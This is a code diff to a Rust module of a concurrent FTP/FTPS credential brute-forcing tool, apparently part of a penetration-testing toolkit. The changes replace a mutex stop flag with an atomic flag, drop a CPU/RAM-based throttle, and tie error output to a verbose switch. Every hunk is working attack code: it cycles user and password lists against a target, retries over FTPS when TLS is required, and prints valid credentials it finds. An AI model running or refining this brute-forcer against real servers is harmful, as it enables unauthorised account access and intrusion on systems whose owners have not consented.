@@ -1,52 +1,17 @@
 use anyhow::{anyhow, Result};
 use colored::*;
-use suppaftp::{
-    AsyncFtpStream,
-    AsyncNativeTlsFtpStream,
-    AsyncNativeTlsConnector,
-};
+use suppaftp::{AsyncFtpStream, AsyncNativeTlsConnector, AsyncNativeTlsFtpStream};
 use suppaftp::async_native_tls::TlsConnector;
 use std::{
     fs::File,
     io::{BufRead, BufReader, Write},
     path::PathBuf,
-    sync::Arc, // Keep Arc
-};
-use tokio::{
-    sync::{Mutex, Semaphore}, // Import Semaphore
-    time::{sleep, Duration}
+    sync::Arc,
 };
 use std::path::Path;
-use sysinfo::System;
+use std::sync::atomic::{AtomicBool, Ordering};
+use tokio::{sync::{Mutex, Semaphore}, time::{sleep, Duration}};
 use futures::stream::{FuturesUnordered, StreamExt};
-
-async fn dynamic_throttle(running: usize, max_concurrency: usize) {
-    let mut system = System::new_all();
-    system.refresh_all();
-
-    let cpu_count = system.cpus().len();
-    let cpu_usage = if cpu_count > 0 {
-        system.cpus().iter().map(|cpu| cpu.cpu_usage()).sum::<f32>() / cpu_count as f32
-    } else {
-        0.0
-    };
-    let total_memory = system.total_memory();
-    let ram_used = if total_memory > 0 {
-        system.used_memory() as f32 / total_memory as f32
-    } else {
-        0.0
-    };
-
-    if cpu_usage > 80.0 || ram_used > 0.8 {
-        sleep(Duration::from_millis(50)).await;
-    } else if cpu_usage > 60.0 || ram_used > 0.6 {
-        sleep(Duration::from_millis(25)).await;
-    } else if running > max_concurrency { // This condition is now less critical for preventing "too many open files"
-        sleep(Duration::from_millis(10)).await;
-    } else {
-        sleep(Duration::from_millis(1)).await;
-    }
-}
 
 /// Format IPv4 or IPv6 addresses with port
 fn format_addr(target: &str, port: u16) -> String {
@@ -102,7 +67,7 @@ pub async fn run(target: &str) -> Result<()> {
 
     let addr = format_addr(target, port);
     let found = Arc::new(Mutex::new(Vec::new()));
-    let stop = Arc::new(Mutex::new(false));
+    let stop = Arc::new(AtomicBool::new(false));
 
     println!("\n[*] Starting brute-force on {}", addr);
 
@@ -122,90 +87,99 @@ pub async fn run(target: &str) -> Result<()> {
 
     if combo_mode {
         for user in &users {
-            if *stop.lock().await && stop_on_success { break; }
+            if stop_on_success && stop.load(Ordering::Relaxed) { break; }
             for pass in &passes {
-                if *stop.lock().await && stop_on_success { break; }
+                if stop_on_success && stop.load(Ordering::Relaxed) { break; }
 
                 let addr_clone = addr.clone();
                 let user_clone = user.clone();
                 let pass_clone = pass.clone();
                 let found_clone = Arc::clone(&found);
                 let stop_clone = Arc::clone(&stop);
-                let semaphore_clone = Arc::clone(&semaphore); // Clone semaphore for the task
+                let semaphore_clone = Arc::clone(&semaphore);
+                let verbose_flag = verbose;
+                let stop_on_success_flag = stop_on_success;
 
                 tasks.push(tokio::spawn(async move {
-                    // Acquire a permit. This will block if `concurrency` limit is reached.
-                    let _permit = semaphore_clone.acquire().await.expect("Failed to acquire semaphore permit");
-
-                    // Proceed with the task logic only after a permit is acquired
-                    if *stop_clone.lock().await && stop_on_success { return; }
-                    match try_ftp_login(&addr_clone, &user_clone, &pass_clone).await {
+                    if stop_on_success_flag && stop_clone.load(Ordering::Relaxed) {
+                        return;
+                    }
+                    let permit = match semaphore_clone.acquire_owned().await {
+                        Ok(permit) => permit,
+                        Err(_) => return,
+                    };
+                    if stop_on_success_flag && stop_clone.load(Ordering::Relaxed) {
+                        return;
+                    }
+                    match try_ftp_login(&addr_clone, &user_clone, &pass_clone, verbose_flag).await {
                         Ok(true) => {
                             println!("[+] {} -> {}:{}", addr_clone, user_clone, pass_clone);
                             found_clone.lock().await.push((addr_clone.clone(), user_clone.clone(), pass_clone.clone()));
-                            if stop_on_success {
-                                *stop_clone.lock().await = true;
+                            if stop_on_success_flag {
+                                stop_clone.store(true, Ordering::Relaxed);
                             }
                         }
                         Ok(false) => {
-                            log(verbose, &format!("[-] {} -> {}:{}", addr_clone, user_clone, pass_clone));
+                            log(verbose_flag, &format!("[-] {} -> {}:{}", addr_clone, user_clone, pass_clone));
                         }
                         Err(e) => {
-                            log(verbose, &format!("[!] {}: error: {}", addr_clone, e));
+                            log(verbose_flag, &format!("[!] {}: error: {}", addr_clone, e));
                         }
                     }
-                    // Permit is automatically released when `_permit` goes out of scope here
+                    drop(permit);
                 }));
             }
         }
-    } else { // Line-by-line mode
-        if !users.is_empty() || passes.is_empty() {
+    } else {
+        if !users.is_empty() {
             for (i, pass) in passes.iter().enumerate() {
-                if *stop.lock().await && stop_on_success { break; }
-                let user = if users.is_empty() { continue; } else {
-                    users.get(i % users.len()).expect("User list modulus logic error").clone()
-                };
+                if stop_on_success && stop.load(Ordering::Relaxed) { break; }
+                let user = users.get(i % users.len()).expect("User list modulus logic error").clone();
 
                 let addr_clone = addr.clone();
                 let pass_clone = pass.clone();
                 let found_clone = Arc::clone(&found);
                 let stop_clone = Arc::clone(&stop);
-                let semaphore_clone = Arc::clone(&semaphore); // Clone semaphore
+                let semaphore_clone = Arc::clone(&semaphore);
+                let verbose_flag = verbose;
+                let stop_on_success_flag = stop_on_success;
 
                 tasks.push(tokio::spawn(async move {
-                    // Acquire a permit
-                    let _permit = semaphore_clone.acquire().await.expect("Failed to acquire semaphore permit");
-
-                    if *stop_clone.lock().await && stop_on_success { return; }
-                    match try_ftp_login(&addr_clone, &user, &pass_clone).await {
-                         Ok(true) => {
+                    if stop_on_success_flag && stop_clone.load(Ordering::Relaxed) {
+                        return;
+                    }
+                    let permit = match semaphore_clone.acquire_owned().await {
+                        Ok(permit) => permit,
+                        Err(_) => return,
+                    };
+                    if stop_on_success_flag && stop_clone.load(Ordering::Relaxed) {
+                        return;
+                    }
+                    match try_ftp_login(&addr_clone, &user, &pass_clone, verbose_flag).await {
+                        Ok(true) => {
                             println!("[+] {} -> {}:{}", addr_clone, user, pass_clone);
                             found_clone.lock().await.push((addr_clone.clone(), user.clone(), pass_clone.clone()));
-                            if stop_on_success {
-                                *stop_clone.lock().await = true;
+                            if stop_on_success_flag {
+                                stop_clone.store(true, Ordering::Relaxed);
                             }
                         }
                         Ok(false) => {
-                            log(verbose, &format!("[-] {} -> {}:{}", addr_clone, user, pass_clone));
+                            log(verbose_flag, &format!("[-] {} -> {}:{}", addr_clone, user, pass_clone));
                         }
                         Err(e) => {
-                            log(verbose, &format!("[!] {}: error: {}", addr_clone, e));
+                            log(verbose_flag, &format!("[!] {}: error: {}", addr_clone, e));
                         }
                     }
-                    // Permit released
+                    drop(permit);
                 }));
             }
         }
     }
 
-    let mut processed_tasks_count = 0;
     while let Some(res) = tasks.next().await {
-        dynamic_throttle(processed_tasks_count, concurrency).await; // Still useful for CPU/RAM based throttling
         if let Err(e) = res {
             log(verbose, &format!("[!] Task panicked (likely due to forced shutdown or internal error): {}", e));
         }
-        processed_tasks_count += 1;
-        // (stop logic can remain)
     }
 
     let creds = found.lock().await;
@@ -237,8 +211,7 @@ pub async fn run(target: &str) -> Result<()> {
     Ok(())
 }
 
-async fn try_ftp_login(addr: &str, user: &str, pass: &str) -> Result<bool> {
-    // (try_ftp_login function remains unchanged from your last working version)
+async fn try_ftp_login(addr: &str, user: &str, pass: &str, verbose: bool) -> Result<bool> {
     // Attempt 1: Plain FTP
     match AsyncFtpStream::connect(addr).await {
         Ok(mut ftp) => {
@@ -252,14 +225,15 @@ async fn try_ftp_login(addr: &str, user: &str, pass: &str) -> Result<bool> {
                     if msg.contains("530") {
                         return Ok(false);
                     } else if msg.contains("550 SSL/TLS required") || msg.contains("TLS required on the control channel") || msg.contains("220 TLS go first") || msg.contains("SSL connection required") {
-                        log(true, &format!("[i] {} - Plain FTP login indicated TLS required. Attempting FTPS...", addr));
+                        println!("[i] {} - Plain FTP login indicated TLS required. Attempting FTPS...", addr);
                     } else if msg.contains("421") {
                         println!("[-] {} - Server reported too many connections (421). Sleeping briefly...", addr);
                         sleep(Duration::from_secs(2)).await;
                         return Ok(false);
                     } else {
-                        // Log network errors if verbose, otherwise they might be too noisy
-                        log(true, &format!("[!] FTP login error for {} ({}:{}): {} - Raw: {:?}", addr, user, pass, msg, e));
+                        if verbose {
+                            println!("[!] FTP login error for {} ({}:{}): {} - Raw: {:?}", addr, user, pass, msg, e);
+                        }
                         return Err(anyhow!("FTP login error: {}", msg));
                     }
                 }
@@ -268,25 +242,30 @@ async fn try_ftp_login(addr: &str, user: &str, pass: &str) -> Result<bool> {
         Err(e) => {
             let msg = e.to_string();
             if msg.contains("SSL/TLS required") || msg.contains("TLS required on the control channel") || msg.contains("220 TLS go first") || msg.contains("SSL connection required") {
-                log(true, &format!("[i] {} - Plain FTP connection indicated TLS required. Attempting FTPS...", addr));
+                println!("[i] {} - Plain FTP connection indicated TLS required. Attempting FTPS...", addr);
             } else if msg.contains("421") {
                 println!("[-] {} - Server reported too many connections during connect (421). Sleeping briefly...", addr);
                 sleep(Duration::from_secs(2)).await;
                 return Ok(false);
             } else {
-                // Log network errors if verbose
-                log(true, &format!("[!] FTP connection error to {} ({}:{}): {} - Raw: {:?}", addr, user, pass, msg, e));
+                if verbose {
+                    println!("[!] FTP connection error to {} ({}:{}): {} - Raw: {:?}", addr, user, pass, msg, e);
+                }
                 return Err(anyhow!("FTP connection error: {}", msg));
             }
         }
     }
 
     // 2️⃣ Only if needed, try FTPS
-    log(true, &format!("[i] {} Attempting FTPS login for user '{}'", addr, user));
+    if verbose {
+        println!("[i] {} Attempting FTPS login for user '{}'", addr, user);
+    }
     let mut ftp_tls = AsyncNativeTlsFtpStream::connect(addr)
         .await
         .map_err(|e| {
-            log(true, &format!("[!] FTPS base connect failed for {} ({}:{}): {} - Raw: {:?}", addr, user, pass, e, e));
+            if verbose {
+                println!("[!] FTPS base connect failed for {} ({}:{}): {} - Raw: {:?}", addr, user, pass, e, e);
+            }
             anyhow!("FTPS base connect failed: {}", e)
         })?;
 
@@ -306,7 +285,9 @@ async fn try_ftp_login(addr: &str, user: &str, pass: &str) -> Result<bool> {
         .into_secure(connector, domain)
         .await
         .map_err(|e| {
-            log(true, &format!("[!] TLS upgrade failed for {} ({}:{}): {} - Raw: {:?}", addr, user, pass, e, e));
+            if verbose {
+                println!("[!] TLS upgrade failed for {} ({}:{}): {} - Raw: {:?}", addr, user, pass, e, e);
+            }
             anyhow!("TLS upgrade failed: {}", e)
         })?;
 
@@ -320,7 +301,9 @@ async fn try_ftp_login(addr: &str, user: &str, pass: &str) -> Result<bool> {
             if msg.contains("530") {
                 Ok(false)
             } else {
-                log(true, &format!("[!] FTPS error for {} ({}:{}): {} - Raw: {:?}", addr, user, pass, msg, e));
+                if verbose {
+                    println!("[!] FTPS error for {} ({}:{}): {} - Raw: {:?}", addr, user, pass, msg, e);
+                }
                 Err(anyhow!("FTPS error: {}", msg))
             }
         }
